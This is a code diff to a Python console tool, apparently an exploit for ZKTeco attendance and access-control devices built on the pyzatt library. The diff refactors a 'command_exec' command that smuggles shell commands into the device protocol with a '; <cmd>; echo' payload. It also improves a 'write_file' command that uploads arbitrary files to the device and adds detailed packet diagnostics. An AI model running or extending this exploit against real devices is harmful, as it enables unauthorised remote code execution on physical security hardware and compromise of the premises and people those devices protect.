@@ -1,5 +1,6 @@
 import cmd
 import traceback
+import struct
 from pyzatt.pyzatt import pyzatt as pyzk
 from pyzatt.pyzatt.zkmodules import defs as defs
 from pyzatt.pyzatt.misc import *
@@ -69,34 +70,153 @@ class SafeScan(cmd.Cmd):
         finally:
             return True
 
+    def _send_prepared_payload(self, payload, *, data_payload=None, length=None):
+        """Send a payload using the prepare/data handshake.
+
+        Some endpoints (like command execution) only require a handshake,
+        while the actual payload is applied later. ``data_payload`` lets us
+        send a minimal buffer during the handshake and reuse ``payload``
+        later without reallocating it. ``length`` overrides the size fields
+        if the target expects a specific value.
+        """
+        try:
+            data = payload if data_payload is None else data_payload
+            data_len = len(data) if length is None else length
+
+            self.z.last_prepare_summary = {
+                "prepare_len": len(payload),
+                "data_len": len(data),
+                "length_override": length,
+            }
+
+            prep_header = struct.pack('<II', data_len, data_len)
+            self.z.send_command(defs.CMD_PREPARE_DATA, prep_header)
+            self.z.recv_reply()
+            if not self.z.recvd_ack():
+                print(self._format_rejection("Prepare-data rejected"))
+                return False
+
+            self.z.send_command(defs.CMD_DATA, data)
+            self.z.recv_reply()
+            if not self.z.recvd_ack():
+                print(self._format_rejection("Data payload rejected"))
+                return False
+
+            return True
+        except Exception:
+            traceback.print_exc()
+            return False
+
     def do_command_exec(self, line):
         if not len(line):
             print("[*] Usage: command_exec <cmd>\n[*] Output will not be returned, but you could write to a file and get it afterwards\n")
             return True
         try:
-            # prepare data
-            self.z.send_command(1500, struct.pack('<II', 1, 1))
-            self.z.recv_reply()
+            payload = b"; " + line.encode() + b"; echo\x00\x00"
 
-            # send data
-            self.z.send_command(1501, 'a'.encode())
-            self.z.recv_reply()
+            # The device only needs the handshake here; send a 1-byte stub
+            # but keep the real payload for the apply stage.
+            if not self._send_prepared_payload(payload, data_payload=b"a", length=1):
+                return True
 
-            # apply data
-            data = bytearray()
-            data.extend(struct.pack('<I', 1700))
-            payload = '; ' + line + '; echo \x00\x00'
-            data.extend(payload.encode())
-            self.z.send_command(110, data)
+            apply_payload = bytearray(struct.pack('<I', 1700))
+            apply_payload.extend(payload)
+            self.z.last_apply_summary = {
+                "apply_code": 110,
+                "apply_len": len(apply_payload),
+            }
+            self.z.send_command(110, apply_payload)
             self.z.recv_reply()
+            if not self.z.recvd_ack():
+                print(self._format_rejection("Command apply rejected"))
+                return True
 
         except Exception:
             traceback.print_exc()
 
+    def _format_rejection(self, prefix):
+        """Return a detailed rejection message for the last reply."""
+        code = self.z.last_reply_code
+        reason = self._describe_reply(code)
+
+        payload = self.z.last_payload_data or bytearray()
+        ascii_preview = payload.decode('latin-1', errors='replace')
+        hex_preview = payload.hex()
+
+        req_code = getattr(self.z, "last_request_code", None)
+        req_payload = getattr(self.z, "last_request_payload", bytearray())
+        req_ascii = req_payload.decode('latin-1', errors='replace')
+        req_hex = req_payload.hex()
+
+        req_packet = getattr(self.z, "last_request_packet", bytearray())
+        req_packet_hex = req_packet.hex()
+
+        packet = getattr(self.z, "last_packet", bytearray()) or bytearray()
+        packet_hex = packet.hex()
+
+        max_hex = 96
+        if len(hex_preview) > max_hex:
+            hex_preview = hex_preview[:max_hex] + "..."
+        if len(packet_hex) > max_hex:
+            packet_hex = packet_hex[:max_hex] + "..."
+        if len(req_hex) > max_hex:
+            req_hex = req_hex[:max_hex] + "..."
+        if len(req_ascii) > max_hex:
+            req_ascii = req_ascii[:max_hex] + "..."
+        if len(req_packet_hex) > max_hex:
+            req_packet_hex = req_packet_hex[:max_hex] + "..."
+
+        header = packet[:16]
+        header_hex = header.hex()
+
+        size = getattr(self.z, "last_reply_size", len(packet) - 8)
+
+        prep = getattr(self.z, "last_prepare_summary", {})
+        apply = getattr(self.z, "last_apply_summary", {})
+
+        history_entries = []
+        for entry in getattr(self.z, "last_reply_history", [])[-3:]:
+            history_entries.append(
+                f"code={hex(entry['code'])} session={entry['session']} "
+                f"reply={entry['counter']} len={entry['payload_len']} size={entry['size_field']} "
+                f"hex={entry['payload_hex']}"
+            )
+        history_desc = " | ".join(history_entries)
+
+        return (
+            f"[!] {prefix}: {hex(code)} ({reason}) "
+            f"session={self.z.last_session_code} reply={self.z.last_reply_counter} "
+            f"payload_len={len(payload)} size_field={size} "
+            f"request_cmd={hex(req_code) if req_code is not None else 'unknown'} "
+            f"request_len={len(req_payload)} request_ascii={req_ascii!r} request_hex={req_hex} "
+            f"request_packet_hex={req_packet_hex} "
+            f"ascii={ascii_preview!r} hex={hex_preview} "
+            f"header_hex={header_hex} packet_hex={packet_hex}"
+            + (f" prepare={prep}" if prep else "")
+            + (f" apply={apply}" if apply else "")
+            + (f" history=[{history_desc}]" if history_desc else "")
+        )
+
+    def _describe_reply(self, code):
+        """Map reply codes to human-readable names."""
+        replies = {
+            defs.CMD_ACK_OK: "CMD_ACK_OK",
+            defs.CMD_ACK_ERROR: "CMD_ACK_ERROR",
+            defs.CMD_ACK_DATA: "CMD_ACK_DATA",
+            defs.CMD_ACK_RETRY: "CMD_ACK_RETRY",
+            defs.CMD_ACK_REPEAT: "CMD_ACK_REPEAT",
+            defs.CMD_ACK_UNAUTH: "CMD_ACK_UNAUTH",
+            defs.CMD_ACK_UNKNOWN: "CMD_ACK_UNKNOWN",
+            defs.CMD_ACK_ERROR_CMD: "CMD_ACK_ERROR_CMD",
+            defs.CMD_ACK_ERROR_INIT: "CMD_ACK_ERROR_INIT",
+            defs.CMD_ACK_ERROR_DATA: "CMD_ACK_ERROR_DATA",
+        }
+        return replies.get(code, "UNKNOWN")
+
 
     def do_write_file(self, line):
         if not len(line) or len(line.split(' ')) != 2:
-            print("[*] Usage: do_exploit_moto <file> <dest>")
+            print("[*] Usage: write_file <local_source> <remote_dest>")
             return True
         file = line.split(' ')[0]
         dest = line.split(' ')[1]
@@ -108,15 +228,23 @@ class SafeScan(cmd.Cmd):
 
         try:
             print("[-] Creating {}".format(file))
-            with open(file, 'r') as fp:
+            with open(file, 'rb') as fp:
                 payload = fp.read()
+        except FileNotFoundError:
+            print("[!] Local file not found: {}".format(file))
+            return True
+        except Exception:
+            traceback.print_exc()
+            return True
+
+        try:
 
             # prepare data
             self.z.send_command(1500, struct.pack('<II', len(payload), len(payload)))
             self.z.recv_reply()
 
             # send data
-            self.z.send_command(1501, payload.encode())
+            self.z.send_command(1501, payload)
             self.z.recv_reply()
 
             # apply data
